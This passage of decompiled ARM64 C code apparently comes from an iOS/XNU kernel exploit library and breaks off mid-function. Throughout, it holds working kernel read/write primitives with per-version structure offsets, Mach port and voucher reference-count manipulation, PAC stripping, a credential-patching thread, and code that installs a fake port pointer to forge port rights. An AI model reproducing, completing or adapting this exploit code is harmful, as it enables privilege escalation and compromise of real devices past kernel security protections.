//----- (000000000003579C) ----------------------------------------------------
__int64 __fastcall get_port_set_kaddr(struct_krwCtx *krwCtx, int a2, __int64 *a3)
{
  __int64 v6; // x22
  int xnuMajorVersion; // w8
  __int64 result; // x0
  int v9; // w9
  __int64 v11; // x23
  unsigned __int64 v12; // x0
  unsigned __int64 v13; // x1
  __int64 v14; // [xsp+8h] [xbp-48h] BYREF
  __int64 v15; // [xsp+10h] [xbp-40h] BYREF
  unsigned __int64 v16; // [xsp+18h] [xbp-38h] BYREF

  v6 = 163855;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  result = 163884;
  if ( xnuMajorVersion <= 8791 )
  {
    if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 )
    {
      if ( xnuMajorVersion == 6153 )
      {
        v11 = 264;
        goto LABEL_16;
      }
      v9 = 7195;
      goto LABEL_13;
    }
LABEL_10:
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      v11 = 256;
    else
      v11 = 248;
    goto LABEL_16;
  }
  if ( xnuMajorVersion == 8792 || xnuMajorVersion == 8796 )
    goto LABEL_10;
  v9 = 10002;
LABEL_13:
  if ( xnuMajorVersion != v9 )
    return result;
  v11 = 248;
LABEL_16:
  v12 = kread_task_struct(krwCtx, mach_task_self_);
  if ( !v12 )
    return 163854;
  if ( kread_physmap_decorated(krwCtx, v12 + v11, &v16) )
  {
    if ( !validate_kaddr_range(krwCtx, v16) )
      return 163878;
    v13 = v16;
    if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
    {
      if ( !kread_physmap_decorated(krwCtx, v16, (unsigned __int64 *)&v15) )
        return v6;
      if ( !validate_kaddr_range(krwCtx, v15) )
        return 163878;
      v13 = v15;
    }
    else
    {
      v15 = v16;
    }
    if ( kread_physmap_decorated(krwCtx, v13 + krwCtx->stride_0x168 * (__int64)a2, (unsigned __int64 *)&v14) )
    {
      if ( validate_kaddr_range(krwCtx, v14) )
      {
        v6 = 0;
        *a3 = v14;
        return v6;
      }
      return 163878;
    }
  }
  return v6;
}

//----- (0000000000035938) ----------------------------------------------------
__int64 __fastcall validate_port_set_chain(struct_krwCtx *krwCtx, int a2, __int64 *a3)
{
  int xnuMajorVersion; // w8
  __int64 result; // x0
  bool v7; // zf
  int v8; // w9
  int v10; // w8
  __int64 v11; // [xsp+8h] [xbp-38h] BYREF
  __int64 v12; // [xsp+10h] [xbp-30h] BYREF
  __int64 v13; // [xsp+18h] [xbp-28h] BYREF

  xnuMajorVersion = krwCtx->xnuMajorVersion;
  result = 163884;
  if ( xnuMajorVersion > 8791 )
  {
    v7 = xnuMajorVersion == 8792 || xnuMajorVersion == 10002;
    v8 = 8796;
  }
  else
  {
    v7 = (unsigned int)(xnuMajorVersion - 8019) < 2 || xnuMajorVersion == 6153;
    v8 = 7195;
  }
  if ( v7 || xnuMajorVersion == v8 )
  {
    result = get_port_set_kaddr(krwCtx, a2, &v13);
    if ( !(uint32_t)result )
    {
      if ( !kread_physmap_decorated(krwCtx, v13 + 16, (unsigned __int64 *)&v12) )
        return 163855;
      if ( validate_kaddr_range(krwCtx, v12) )
      {
        v10 = kread_physmap_decorated(krwCtx, v12 + 56, (unsigned __int64 *)&v11);
        result = 163855;
        if ( !v10 )
          return result;
        if ( validate_kaddr_range(krwCtx, v11) )
        {
          result = 0;
          *a3 = v11;
          return result;
        }
      }
      return 163878;
    }
  }
  return result;
}

//----- (0000000000035A50) ----------------------------------------------------
unsigned __int64 __fastcall kernel_va_base_resolver(struct_krwCtx *krwCtx, int a2, uint32_t *a3)
{
  unsigned __int64 v3; // x20

  if ( a2 )
    return 0;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER) )
  {
    v3 = 0xFFFFFE0000000000LL;
  }
  else
  {
    v3 = 0xFFFFFFE000000000LL;
    if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8792, 80, 25, 0, 0) && !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A9) )
      v3 = 0xFFFFFFDC00000000LL;
  }
  *a3 = 6;
  return v3;
}

//----- (0000000000035AE0) ----------------------------------------------------
int __fastcall necp_set_opt_string_7(struct_krwCtx *krwCtx, unsigned int a2, __int64 a3)
{
    __int64 v3; // x19
    __int64 v7; // x19
    unsigned __int64 v8; // x8
    mach_vm_address_t v9; // x1
    __int64 v10; // x8
    unsigned int v11; // w10
    __int64 v12; // x2
    __int64 v13; // x1
    unsigned __int64 v14; // x9
    __int64 v15; // x10
    __int64 v16; // x11
    int v17; // w0
    int v18; // w8
    int v19; // w0
    void *(__cdecl *v20)(void *); // x0
    int v21; // w8
    __int64 v22; // [xsp+0h] [xbp-80h] BYREF
    unsigned int v23; // [xsp+8h] [xbp-78h]
    unsigned int v24; // [xsp+Ch] [xbp-74h]
    pthread_t v25; // [xsp+10h] [xbp-70h] BYREF
    pthread_attr_t v26; // [xsp+18h] [xbp-68h] BYREF

    if ( a2 > 6 )
      return 0LL;
    v7 = (uint64_t)krwCtx;
    v8 = krwCtx->xnuVersionPacked;
    if ( v8 >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
    {
      v9 = krwCtx->gap_0x18F0 + krwCtx->stride_0x168 * (a2 + 1);
      return kwrite64_dispatch(krwCtx, v9, a3);
    }
    if ( a3 )
    {
      if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 && krw_xpac_vaddr_2(krwCtx, a3) == a3 )
        return 0LL;
    }
    else if ( v8 >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0) && (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 )
    {
      v10 = krwCtx->gap_0x18F0;
      if ( krwCtx->gap_0x3B0 != v10 )
      {
        v14 = -1LL;
        v15 = 1008LL;
        while ( v14 != 6 )
        {
          v16 = krwCtx->raw_0x370[v15 / 8 - 110];
          ++v14;
          v15 += 64LL;
          if ( v16 == v10 )
          {
            if ( v14 < 7 )
            {
              v11 = v14 + 1;
              goto LABEL_16;
            }
            break;
          }
        }
        v17 = pthread_attr_init(&v26);
        if ( v17 )
        {
          if ( v17 >= 0 )
            v18 = v17;
          else
            v18 = -v17;
          return v18 | 0x40000000u;
        }
        else
        {
          v19 = pthread_attr_setdetachstate(&v26, 1);
          if ( v19
            || (v25 = 0LL,
                v22 = v7,
                v23 = a2,
                v24 = 4097,
                v20 = (void *(__cdecl *)(void *))nullsub_1(task_thread_port_cred_patch),
                (v19 = pthread_create(&v25, &v26, v20, &v22)) != 0)
            || (v19 = pthread_join(v25, 0LL)) != 0 )
          {
            if ( v19 >= 0 )
              v21 = v19;
            else
              v21 = -v19;
            v3 = v21 | 0x40000000u;
          }
          else
          {
            v3 = v24;
          }
          pthread_attr_destroy(&v26);
        }
        return v3;
      }
      v11 = 0;
  LABEL_16:
      v12 = krwCtx->raw_0x370[9 + 8LL * v11 + a2];
      v13 = v10 + krwCtx->stride_0x168 * (a2 + 1);
      goto LABEL_18;
    }
    v13 = krwCtx->gap_0x18F0 + krwCtx->stride_0x168 * (a2 + 1);
    v12 = a3;
  LABEL_18:
    return kwrite64(krwCtx, v13, v12);
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000035D94) ----------------------------------------------------
mach_vm_address_t __fastcall ipc_port_kread_and_vm_attr(struct_krwCtx *krwCtx, __int64 a2, int a3)
{
  mach_vm_address_t result; // x0
  mach_vm_address_t v6; // x21
  unsigned int v7; // [xsp+Ch] [xbp-24h] BYREF

  result = get_ipc_port_offset_by_version(krwCtx, a2);
  if ( result )
  {
    v6 = result;
    result = kread_u32(krwCtx, result, &v7);
    if ( (uint32_t)result )
      return v7 <= 0x80000000 && noppl_kwrite32(krwCtx, v6, v7 + a3);
  }
  return result;
}

//----- (0000000000035E18) ----------------------------------------------------
__int64 __fastcall kread_modify_u32_with_delta(struct_krwCtx *krwCtx, __int64 a2, int a3)
{
  __int64 v5; // x20
  __int64 result; // x0
  int v7; // [xsp+Ch] [xbp-24h] BYREF

  v5 = a2 + 4;
  result = krw_read_thunk(krwCtx, a2 + 4, 4, &v7);
  if ( (uint32_t)result )
  {
    v7 += a3;
    return (unsigned int)kwrite_with_retry(krwCtx, v5, (__int64)&v7, 4) != 0;
  }
  return result;
}

//----- (0000000000035E8C) ----------------------------------------------------
__int64 __fastcall kread_and_vm_attr_double(struct_krwCtx *krwCtx, __int64 a2)
{
  kread_modify_u32_with_delta(krwCtx, a2, 1);
  ipc_port_kread_and_vm_attr(krwCtx, a2, 1);
  return 0;
}

//----- (0000000000035ECC) ----------------------------------------------------
__int64 __fastcall vm_attr_increment_offset_bounded(struct_krwCtx *krwCtx, unsigned __int64 a2, int a3)
{
  mach_vm_address_t v6; // x22
  __int64 result; // x0
  __int64 v8; // x21
  __int64 v9; // [xsp+0h] [xbp-30h] BYREF
  int v10; // [xsp+Ch] [xbp-24h] BYREF

  v6 = a2 + 16;
  result = kread_u32(krwCtx, a2 + 16, &v10);
  if ( (uint32_t)result )
  {
    if ( (unsigned int)(v10 - 1) >> 20 )
      return 0;
    result = ppl_kwrite32(krwCtx, v6, v10 + a3);
    if ( !(uint32_t)result )
      return result;
    if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
      return 1;
    result = kread_physmap_decorated(krwCtx, a2, (unsigned __int64 *)&v9);
    if ( (uint32_t)result )
    {
      result = validate_kaddr_range(krwCtx, v9);
      if ( result )
      {
        v8 = krwCtx->xnuMajorVersion <= 10001 ? 24LL : 0LL;
        result = kread_u32(krwCtx, v8 + v9, &v10);
        if ( (uint32_t)result )
        {
          if ( !((unsigned int)(v10 - 1) >> 20) )
          {
            result = noppl_kwrite32(krwCtx, v9 + v8, v10 + a3);
            if ( !(uint32_t)result )
              return result;
            return 1;
          }
          return 0;
        }
      }
    }
  }
  return result;
}

//----- (0000000000035FD8) ----------------------------------------------------
__int64 __fastcall vm_attr_increment_offset_check(struct_krwCtx *krwCtx, unsigned __int64 a2)
{
  if ( (unsigned int)vm_attr_increment_offset_bounded(krwCtx, a2, 16) )
    return 0;
  else
    return 4097;
}

//----- (0000000000036000) ----------------------------------------------------
__int64 __fastcall vm_attr_field_offset_add4_check(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 v3; // x19
  mach_vm_address_t v4; // x21
  int v6; // [xsp+Ch] [xbp-24h] BYREF

  v3 = 163855;
  v4 = a2 + 16;
  if ( kread_u32(krwCtx, a2 + 16, &v6) )
  {
    if ( v6 )
    {
      if ( noppl_kwrite32(krwCtx, v4, v6 + 4) )
        return 0;
      else
        return 163856;
    }
    else
    {
      return 163857;
    }
  }
  return v3;
}

//----- (0000000000036078) ----------------------------------------------------
struct_krwCtx *__fastcall krw_ctx_set_flag(struct_krwCtx *result, int a2)
{
  result->flags |= a2;
  return result;
}

//----- (0000000000036088) ----------------------------------------------------
struct_krwCtx *__fastcall krw_ctx_clr_flag(struct_krwCtx *result, int a2)
{
  result->flags &= ~a2;
  return result;
}

//----- (0000000000036098) ----------------------------------------------------
bool __fastcall krw_ctx_has_flag(struct_krwCtx *krwCtx, int flag)
{
  return (krwCtx->flags & flag) != 0;
}

//----- (00000000000360A8) ----------------------------------------------------
__int64 __fastcall get_task_struct_offset_cached(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  __int64 v3; // x1
  mach_vm_address_t v4; // x20
  int v5; // [xsp+4h] [xbp-1Ch] BYREF
  __int64 v6; // [xsp+8h] [xbp-18h] BYREF

  v6 = 0;
  result = krwCtx->gap_0x210;
  if ( !result )
  {
    v3 = krwCtx->gap_0x19D0_size8;
    if ( v3 )
    {
      result = get_task_struct_offset(krwCtx, v3);
      if ( !result )
        return result;
      v4 = result;
      if ( kread_physmap_decorated(krwCtx, result, (unsigned __int64 *)&v6) )
      {
        if ( v6 )
        {
          result = validate_kaddr_range(krwCtx, v6);
          if ( !result )
            return result;
LABEL_10:
          result = v6;
          krwCtx->gap_0x210 = v6;
          return result;
        }
        v5 = 512;
        result = alloc_physmap_scratch_page(krwCtx, &v5);
        v6 = result;
        if ( !result )
          return result;
        if ( kwrite64(krwCtx, v4, result) )
          goto LABEL_10;
      }
    }
    return 0;
  }
  return result;
}

//----- (0000000000036160) ----------------------------------------------------
__int64 __fastcall lookup_physmap_page_slot(struct_krwCtx *krwCtx, unsigned int a2, __int64 *a3)
{
  __int64 result; // x0
  __int64 v7; // [xsp+8h] [xbp-28h] BYREF

  if ( a2 > 0xD )
    return 0;
  result = get_task_struct_offset_cached(krwCtx);
  v7 = result;
  if ( result )
  {
    result = kread_physmap_decorated(krwCtx, result + krwCtx->stride_0x168 * a2, (unsigned __int64 *)&v7);
    if ( (uint32_t)result )
    {
      *a3 = v7;
      return 1;
    }
  }
  return result;
}

//----- (00000000000361DC) ----------------------------------------------------
__int64 __fastcall cache_physmap_page_slot(struct_krwCtx *krwCtx, unsigned int a2, __int64 a3)
{
  __int64 result; // x0
  __int64 v6; // x20
  __int64 v7; // [xsp+8h] [xbp-28h] BYREF

  v7 = a3;
  if ( a2 > 0xD )
    return 0;
  v6 = krwCtx->stride_0x168;
  result = get_task_struct_offset_cached(krwCtx);
  if ( result )
    return kwrite_with_retry(krwCtx, result + (unsigned int)v6 * a2, &v7, v6);
  return result;
}

//----- (0000000000036248) ----------------------------------------------------
bool __fastcall voucher_create_mach_voucher(__int64 a1, __int64 a2, ipc_voucher_t *voucherOut)
{
  host_t v4; // w0
  struct mach_voucher_u64_recipe recipe; // [xsp+0h] [xbp-30h] BYREF

  recipe.key = 7;
  recipe.command = 0xD3;
  recipe.previousVoucher = 0;
  recipe.contentSize = sizeof(recipe.content);
  recipe.content = a2;
  v4 = mach_host_self();
  return host_create_mach_voucher(v4, (mach_voucher_attr_raw_recipe_array_t)&recipe, 0x18u, voucherOut) == 0;
}

//----- (000000000003629C) ----------------------------------------------------
__int64 __fastcall create_mach_port_with_a2(struct_krwCtx *krwCtx, unsigned int a2)
{
  pid_t pid; // w0
  int mach_port; // w0
  int v6; // w19
  int v7; // w8
  __int64 buffer; // [xsp+8h] [xbp-18h] BYREF

  buffer = 0;
  pid = getpid();
  if ( proc_pidinfo(pid, 32, 0, &buffer, 8) == 8 )
  {
    if ( (unsigned int)buffer >= a2 )
    {
      return 0;
    }
    else
    {
      mach_port = create_mach_port(a2);
      if ( mach_port )
        return mach_port | 0x80000000;
      else
        return 0;
    }
  }
  else
  {
    v6 = errno;
    v7 = errno;
    if ( v6 < 0 )
      v7 = -v7;
    return v7 | 0x40000000u;
  }
}

//----- (0000000000036330) ----------------------------------------------------
__int64 __fastcall create_mach_port(int a1)
{
  __int64 v2; // x19
  unsigned int inserted; // w0
  mach_port_name_t name; // [xsp+Ch] [xbp-24h] BYREF

  name = 0;
  v2 = mach_port_allocate(mach_task_self_, 1u, &name);
  if ( !(uint32_t)v2 )
  {
    inserted = mach_port_insert_right(mach_task_self_, (a1 << 8) | 3, name, 0x15u);
    if ( inserted )
    {
      if ( inserted == 13 )
        v2 = 0;
      else
        v2 = inserted;
    }
    else
    {
      mach_port_deallocate(mach_task_self_, (a1 << 8) | 3);
      v2 = 0;
    }
  }
  if ( name + 1 >= 2 )
    mach_port_mod_refs(mach_task_self_, name, 1u, -1);
  return v2;
}

//----- (00000000000363E4) ----------------------------------------------------
__int64 __fastcall validate_physmap_range_7(__int64 a1, unsigned int a2)
{
  pid_t v3; // w0
  int mach_port; // w0
  int v6; // w19
  int v7; // w8
  __int64 buffer; // [xsp+8h] [xbp-18h] BYREF

  buffer = 0;
  v3 = getpid();
  if ( proc_pidinfo(v3, 32, 0, &buffer, 8) == 8 )
  {
    if ( HIDWORD(buffer) >= a2 )
    {
      return 0;
    }
    else
    {
      mach_port = create_mach_port(a2 - HIDWORD(buffer) + (unsigned int)buffer);
      if ( mach_port )
        return mach_port | 0x80000000;
      else
        return 0;
    }
  }
  else
  {
    v6 = errno;
    v7 = errno;
    if ( v6 < 0 )
      v7 = -v7;
    return v7 | 0x40000000u;
  }
}

//----- (0000000000036480) ----------------------------------------------------
uint32_t __fastcall plist_elem_is_string_6(struct_krwCtx *krwCtx, unsigned __int64 a2, mach_port_name_t *a3)
{
  __int64 v6; // x25
  int v7; // w0
  unsigned int v8; // w9
  __int64 v9; // x22
  unsigned __int64 xnuVersionPacked; // x8
  int v11; // w23
  uint64_t v12; // x0
  __int64 v13; // x0
  __int64 v14; // x22
  vm_size_t v15; // x23
  kern_return_t v16; // w0
  mach_port_name_t v17; // w24
  int xnuMajorVersion; // w8
  __int64 v19; // x23
  __int64 v20; // x0
  unsigned __int64 v21; // x0
  mach_vm_address_t v22; // x22
  __int64 v23; // x0
  int v24; // w8
  __int64 v25; // x23
  int v26; // w20
  unsigned int v27; // w24
  vm_address_t v28; // x22
  unsigned int v29; // w8
  __int64 v30; // x0
  int v31; // w8
  int v33; // w0
  __int64 v34; // x0
  __int64 v35; // x22
  __int64 v36; // x0
  int v37; // w23
  int v38; // w24
  __int64 v39; // x0
  mach_vm_address_t v40; // x22
  unsigned int v41; // w28
  mach_port_t v42; // w22
  mach_port_t v43; // w23
  mach_port_name_t v45; // w23
  __int64 v46; // x0
  mach_vm_address_t v47; // x21
  int v48; // [xsp+4h] [xbp-7Ch] BYREF
  __int64 v49; // [xsp+8h] [xbp-78h] BYREF
  mach_port_t previous[2]; // [xsp+10h] [xbp-70h] BYREF
  unsigned __int64 __buf; // [xsp+18h] [xbp-68h] BYREF
  mach_port_name_t name[2]; // [xsp+20h] [xbp-60h] BYREF
  vm_address_t address; // [xsp+28h] [xbp-58h] BYREF

  v6 = 163856;
  LODWORD(address) = 0;
  v7 = kread_u32(krwCtx, a2, &address);
  if ( (address & 0x80000000) == 0LL )
    v8 = 163848;
  else
    v8 = 0;
  if ( v7 )
    v9 = v8;
  else
    v9 = 163855;
  if ( !v7 || (address & 0x80000000) == 0 )
    return v9;
  xnuVersionPacked = krwCtx->xnuVersionPacked;
  if ( xnuVersionPacked < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
  {
LABEL_21:
    *(uint64_t *)name = 0;
    xnuMajorVersion = krwCtx->xnuMajorVersion;
    v9 = 163884;
    v19 = 56;
    if ( xnuMajorVersion <= 8018 )
    {
      if ( xnuMajorVersion != 6153 && xnuMajorVersion != 7195 )
        return v9;
    }
    else if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 )
    {
      if ( xnuMajorVersion != 8792 )
        return v9;
      v19 = 48;
    }
    arc4random_buf(&__buf, 8u);
    v49 = 0;
    *(uint64_t *)previous = 0;
    if ( !voucher_create_mach_voucher(v20, __buf, &name[1]) )
    {
LABEL_71:
      v26 = 0;
      v6 = 4097;
      goto LABEL_72;
    }
    v21 = get_task_kobject_addr(krwCtx, name[1]);
    if ( v21 )
    {
      v22 = v21 + v19;
      if ( !kread_physmap_decorated(krwCtx, v21 + v19, &address) )
        goto LABEL_45;
      if ( validate_kaddr_range(krwCtx, address) )
      {
        v23 = kwrite64(krwCtx, v22, a2);
        if ( !(uint32_t)v23 )
          goto LABEL_86;
        v24 = krwCtx->xnuMajorVersion;
        if ( v24 >= 8020 )
        {
          v23 = kread_physmap_decorated(krwCtx, a2 + 88, (unsigned __int64 *)&v49);
          if ( (uint32_t)v23 )
          {
            if ( v49 != 1 )
            {
              v23 = kwrite64(krwCtx, a2 + 88, 1);
              if ( !(uint32_t)v23 )
                goto LABEL_86;
            }
            v25 = 88;
LABEL_66:
            if ( voucher_create_mach_voucher(v23, __buf, name) )
            {
              v31 = krwCtx->xnuMajorVersion;
              if ( v31 < 8020 )
              {
                if ( v31 == 8019
                  && previous[1] != previous[0]
                  && !(unsigned int)kwrite_with_retry(krwCtx, a2 + 8, (__int64)&previous[1], 4) )
                {
                  goto LABEL_86;
                }
              }
              else if ( v49 != 1 && !kwrite64(krwCtx, v25 + a2, v49) )
              {
                goto LABEL_86;
              }
              v33 = kwrite64(krwCtx, v22, address);
              v26 = v33;
              if ( v33 )
                v6 = 0;
              else
                v6 = 163856;
              goto LABEL_72;
            }
            goto LABEL_71;
          }
          goto LABEL_45;
        }
        if ( v24 != 8019 )
        {
LABEL_44:
          v25 = 0;
          goto LABEL_66;
        }
        v23 = krw_read_thunk(krwCtx, a2 + 8, 4, &previous[1]);
        if ( (uint32_t)v23 )
        {
          if ( (previous[1] & 0x1000000) != 0 )
          {
            v25 = 0;
            previous[0] = previous[1];
            goto LABEL_66;
          }
          previous[0] = previous[1] | 0x1000000;
          v23 = kwrite_with_retry(krwCtx, a2 + 8, (__int64)previous, 4);
          if ( (uint32_t)v23 )
            goto LABEL_44;
LABEL_86:
          v26 = 0;
          goto LABEL_72;
        }
LABEL_45:
        v26 = 0;
        v6 = 163855;
        goto LABEL_72;
      }
      v26 = 0;
      v6 = 163878;
    }
    else
    {
      v26 = 0;
      v6 = 163877;
    }
LABEL_72:
    if ( name[1] + 1 >= 2 )
      mach_port_deallocate(mach_task_self_, name[1]);
    if ( v26 )
    {
      *a3 = name[0];
    }
    else if ( name[0] + 1 >= 2 )
    {
      mach_port_deallocate(mach_task_self_, name[0]);
    }
    return v6;
  }
  if ( xnuVersionPacked <= XNU_VERSION_PACKED(8020, 99, 1023, 1023, 1023) )
    v11 = 0x400000;
  else
    v11 = 0x200000;
  v12 = kread_u32(krwCtx, a2 + 8, &address);
  if ( !v12 )
    return 163855;
  if ( ((unsigned int)address & v11) != 0 )
  {
    v12 = noppl_kwrite32(krwCtx, a2 + 8, address & ~v11);
    if ( !v12 )
      return v6;
  }
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
    goto LABEL_21;
  name[0] = 0;
  *(uint64_t *)previous = 0;
  v48 = 0;
  address = 0;
  v9 = validate_physmap_range_7(v12, 8u);
  if ( !(uint32_t)v9 )
  {
    v13 = setup_task_port_chain(krwCtx, mach_task_self_, &v49, &name[1]);
    if ( v13 )
    {
      v14 = v13;
      v15 = name[1] * (unsigned int)v49;
      v16 = vm_allocate(mach_task_self_, &address, v15, 1);
      if ( v16 )
      {
        v17 = 0;
        v9 = v16 | 0x80000000;
      }
      else if ( (unsigned int)krw_read_thunk(krwCtx, v14, name[1] * (unsigned int)v49, (void *)address) )
      {
        if ( (uint32_t)v49 )
        {
          v27 = 0;
          while ( 1 )
          {
            __buf = 0;
            v28 = address + name[1] * v27;
            __memcpy_chk(&__buf, (const void *)v28, krwCtx->stride_0x168, 8u);
            if ( __buf )
            {
              __buf = krw_xpac_vaddr_2(krwCtx, __buf);
              if ( __buf == a2 )
              {
                v29 = *(uint32_t *)(v28 + krwCtx->stride_0x168);
                if ( (v29 & 0x10000) != 0 )
                  break;
              }
            }
            if ( ++v27 >= (unsigned int)v49 )
              goto LABEL_54;
          }
          v9 = 0;
          v17 = __PAIR64__(v27, v29) >> 24;
        }
        else
        {
LABEL_54:
          v17 = 0;
          v9 = 0;
        }
      }
      else
      {
        v17 = 0;
        v9 = 163855;
      }
      if ( address && (uint32_t)v15 )
        vm_deallocate(mach_task_self_, address, v15);
      if ( !(uint32_t)v9 )
      {
        if ( v17 + 1 >= 2 )
        {
          LODWORD(v30) = mach_port_mod_refs(mach_task_self_, v17, 0, 1);
          if ( !(uint32_t)v30 )
          {
            v9 = 0;
            *a3 = v17;
            return v9;
          }
          return (unsigned int)v30 | 0x80000000;
        }
        LODWORD(v30) = mach_port_allocate(mach_task_self_, 1u, name);
        if ( (uint32_t)v30 )
          return (unsigned int)v30 | 0x80000000;
        v34 = task_self_get_ipc_port(krwCtx, name[0]);
        if ( !v34 )
          return 163854;
        v35 = v34;
        v36 = ipc_port_kobject_field_offset(krwCtx, v34);
        if ( !v36 )
          return 163884;
        v37 = v36;
        v38 = krwCtx->stride_0x168;
        if ( !kread_u32(krwCtx, a2, &v48) )
          return 163855;
        TRACE_PORTS("plist_elem_is_string_6 notif prep ctx=%llx target=%llx name=%x self_port=%llx off=%x ptr=%llx bits=%x stride_0x168=%d\n",
                    (unsigned long long)a1,
                    (unsigned long long)a2,
                    name[0],
                    (unsigned long long)v35,
                    v37,
                    (unsigned long long)(v35 + (unsigned int)(v37 - v35 + 2 * v38)),
                    v48,
                    v38);
        if ( (v48 & 0x400) != 0 )
        {
          v12 = noppl_kwrite32(krwCtx, a2, v48 & 0xFFFFFBFF);
          TRACE_PORTS("plist_elem_is_string_6 clear bits ok=%d addr=%llx old=%x new=%x\n",
                      (int)v12,
                      (unsigned long long)a2,
                      v48,
                      v48 & 0xFFFFFBFF);
          if ( !v12 )
            return 163856;
        }
        v12 = kwrite_physmap_with_a3_ptr(krwCtx, v35 + (unsigned int)(v37 - v35 + 2 * v38), a2);
        TRACE_PORTS("plist_elem_is_string_6 install fake ok=%d slot=%llx value=%llx\n",
                    (int)v12,
                    (unsigned long long)(v35 + (unsigned int)(v37 - v35 + 2 * v38)),
                    (unsigned long long)a2);
        if ( !v12 )
        {
          return 163856;
        }
        v30 = mach_port_request_notification(mach_task_self_, name[0], 70, 1u, 0, 0x15u, &previous[1]);
        TRACE_PORTS("plist_elem_is_string_6 request_notification ret=%x name=%x previous=%x\n",
                    (unsigned int)v30,
                    name[0],
                    previous[1]);
        if ( (uint32_t)v30 )
          return (unsigned int)v30 | 0x80000000;
        v9 = 163848;
        if ( previous[1] + 1 >= 2 )
        {
          v9 = validate_physmap_range_7(v30, 8u);
          if ( !(uint32_t)v9 )
          {
            v39 = task_self_get_ipc_port_ptr(krwCtx, previous[1]);
            if ( !v39 )
              return 163854;
            v40 = v39 + 8;
            if ( kread_u32(krwCtx, v39 + 8, previous) )
            {
              if ( (previous[0] & 0x1F0000) != 0x40000 )
                return 163857;
              previous[0] = (previous[0] & 0xFFE0FFFF) | 0x10000;
              if ( noppl_kwrite32(krwCtx, v40, previous[0]) )
              {
                LODWORD(v30) = mach_port_mod_refs(mach_task_self_, name[0], 1u, -1);
                if ( !(uint32_t)v30 )
                {
                  v41 = 0;
                  v42 = mach_task_self_;
                  v43 = previous[1];
                  while ( 1 )
                  {
                    LODWORD(address) = 0;
                    LODWORD(v30) = mach_port_allocate(v42, 1u, (mach_port_name_t *)&address);
                    if ( (uint32_t)v30 )
                      break;
                    LODWORD(v30) = mach_port_mod_refs(v42, address, 1u, -1);
                    if ( (uint32_t)v30 )
                      break;
                    LODWORD(v30) = mach_port_insert_right(v42, address, v43, 0x13u);
                    if ( !(uint32_t)v30 )
                    {
                      v45 = address;
                      if ( (v48 & 0x400) != 0 )
                        noppl_kwrite32(krwCtx, a2, v48);
                      v46 = task_self_get_ipc_port_ptr(krwCtx, previous[1]);
                      if ( !v46 )
                        return 163854;
                      v47 = v46 + 8;
                      if ( !kread_u32(krwCtx, v46 + 8, previous) )
                        return 163855;
                      if ( (previous[0] & 0x1F0000) == 0x10000 )
                      {
                        previous[0] = (previous[0] & 0xFFE0FFFF) | 0x100000;
                        v9 = 163856;
                        if ( !noppl_kwrite32(krwCtx, v47, previous[0]) )
                          return v9;
                        LODWORD(v30) = mach_port_mod_refs(mach_task_self_, previous[1], 4u, -1);
                        if ( !(uint32_t)v30 )
                        {
                          v9 = 0;
                          *a3 = v45;
                          return v9;
                        }
                        return (unsigned int)v30 | 0x80000000;
                      }
                      return 163857;
                    }
                    if ( (v30 & 0xFFFFFFF7) != 5 || v41++ >= 8 )
                      return (unsigned int)v30 | 0x80000000;
                  }
                }
                return (unsigned int)v30 | 0x80000000;
              }
              return 163856;
            }
            return 163855;
          }
        }
      }
    }
    else
    {
      return 163878;
    }
  }
  return v9;
}
// 36648: variable 'v20' is possibly undefined

//----- (0000000000036C10) ----------------------------------------------------
uint64_t *__fastcall build_csblob_buf_from_load_cmds(struct_krwCtx *krwCtx, unsigned int a2)
{
  int xnuMajorVersion; // w8
  unsigned int v5; // w8
  size_t v6; // x21
  uint64_t *result; // x0
  uint64_t *v8; // x20
  int v9; // w22
  unsigned int v10; // w20
  unsigned __int64 v11; // x0
  __int64 v12; // [xsp+8h] [xbp-48h] BYREF
  unsigned __int64 v13; // [xsp+10h] [xbp-40h] BYREF
  mach_port_name_t name[2]; // [xsp+18h] [xbp-38h] BYREF
  void *v15; // [xsp+20h] [xbp-30h] BYREF
  void *v16; // [xsp+28h] [xbp-28h] BYREF

  *(uint64_t *)name = 0;
  v15 = 0;
  v12 = 0;
  v13 = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion != 7195 && xnuMajorVersion != 6153 )
    return 0;
  v5 = krwCtx->pageSizeOrSomething;
  if ( v5 <= a2 )
    v6 = a2;
  else
    v6 = v5;
  v16 = 0;
  result = calloc(v6, 1u);
  if ( result )
  {
    v8 = result;
    v9 = alloc_buf_with_magic(2 * (int)v6, &v16);
    if ( !v9 )
    {
      v9 = parse_load_command_entry((__int64 *)v16, 0x1000000, 4u, 0);
      if ( !v9 )
      {
        v9 = parse_load_command_entry((__int64 *)v16, 0x8000000, 4u, "key");
        if ( !v9 )
        {
          v9 = parse_load_command_entry((__int64 *)v16, -1979711488, v6, v8);
          if ( !v9 )
            v9 = copy_buf_struct_to_heap((__int64)v16, &v15, &name[1]);
        }
      }
    }
    if ( v16 )
      free_and_null_ptr((void **)v16);
    free(v8);
    if ( v9 )
      return 0;
    v10 = register_ioservice_publish_notify((__int64)v15, name[1], name);
    if ( v10 + 1 >= 2 )
    {
      v11 = get_task_kobject_addr(krwCtx, v10);
      v13 = v11;
      if ( v11 )
      {
        if ( kread_physmap_decorated(krwCtx, v11 + 16, &v13)
